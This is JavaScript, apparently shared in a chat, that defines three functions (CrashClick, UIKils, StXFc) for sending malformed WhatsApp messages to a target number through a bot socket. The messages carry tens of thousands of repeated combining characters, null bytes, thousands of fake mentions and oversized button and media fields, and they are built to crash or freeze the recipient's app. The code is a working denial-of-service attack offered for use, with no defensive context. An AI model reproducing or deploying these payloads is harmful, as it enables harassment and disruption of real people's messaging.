@⁨DevAfeez⁩ async function CrashClick(sock, target) {
  const content = {
    extendedTextMessage: {
      text: "jancokx",
      matchedText: "https://wa.me/stickerpack/hanyut",
      description: "𑇂𑆵𑆴𑆿".repeat(12000),
      title: "alayy di sini sayang" + "𑇂𑆵𑆴𑆿".repeat(5000),
      previewType: "NONE",
      jpegThumbnail: null
    }
  };

  
  const p = await generateWAMessageFromContent("status@broadcast", content, {
    ephemeralExpiration: 10,
    timeStamp: Date.now()
  });

  await sock.relayMessage("status@broadcast", p.message, {
    messageId: p.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
              },
            ],
          },
        ],
      },
    ],
  });
}

// Ui
async function UIKils(sock, target, mention = true) {
  const qwerty = "https://files.catbox(.)moe/isi-sendiri.jpg"
  const msg = generateWAMessageFromContent(
    target,
    proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { 
              text: "ꦾ".repeat(10000) + "ꦽ".repeat(2500) + "ោ៝".repeat(2500)
            },
            nativeFlowMessage: {
              messageParamsJson: "{}".repeat(10000),
              buttons: [
                {
                  name: "Renz_message",
                  buttonParamsJson: JSON.stringify({
                    flow_id: Date.now(),
                    flow_message_version: "9",
                    flow_token: Date.now(),
                    flow_action: "share",
                    flow_action_payload: {
                      screen: "GALLERY_SCREEN",
                      params: {
                        media_type: "image",
                        max_selection: 9999999
                      }
                    },
                    flow_cta: "x",
                    icon: qwerty,
                    updated_at: null,
                    experimental_flags: {
                      use_native_flow_v2: true,
                      enable_logging_context: true
                    }
                  })
                }
              ]
            },
            ...(mention ? { contextInfo: { mentionedJid: [target] } } : {})
          }
        }
      }
    }),
    {}
  );

  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

// Crash
async function StXFc(sock, jid) {
  let baten = [];
  const buttonss = [
    { name: "single_select", buttonParamsJson: "" }
  ];

  for (let i = 0; i < 10; i++) {
    baten.push(
      { name: "cta_call",    buttonParamsJson: JSON.stringify({ status: true }) },
      { name: "cta_copy",    buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) },
      { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) }
    );
  }

  const stxview = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
      contextInfo: {
        participant: jid,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
        remoteJid: "X",
        participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
        stanzaId: "123",
        quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000
                },
                forwardedAiBotMessageInfo: {
                  botName: "META AI",
                  botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                  creatorName: "Bot"
                }
      }
    },
          carouselMessage: {
            messageVersion: 1,
            cards: [
              {
                header: {
                  hasMediaAttachment: true,
                  imageMessage: {
    url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
    fileLength: "9999999999999",
    height: 9999,
    width: 9999,
    mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
    fileEncSha256: "D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
    directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1755254367",
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgITEDQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAQIAEBEgEhNR/9oACAEDAQE/AKOiw7YoRELToaGwSM4M5t6b/9k=",
  },
                },
                body: { text: "alayyy" + "\u0000".repeat(5000) },
                nativeFlowMessage: {
                  buttons: baten,
                  messageParamsJson: "{".repeat(10000)
                }
              }
            ]
          }
        }
      }
    }
  };
  
    await sock.relayMessage(jid, stxview, {
      messageId: null,
      participant: { jid: jid },
      userJid: jid
    }),
    await sock.relayMessage(jid, stxview, {
      messageId: null,
      participant: { jid: jid },
      userJid: jid
    });
}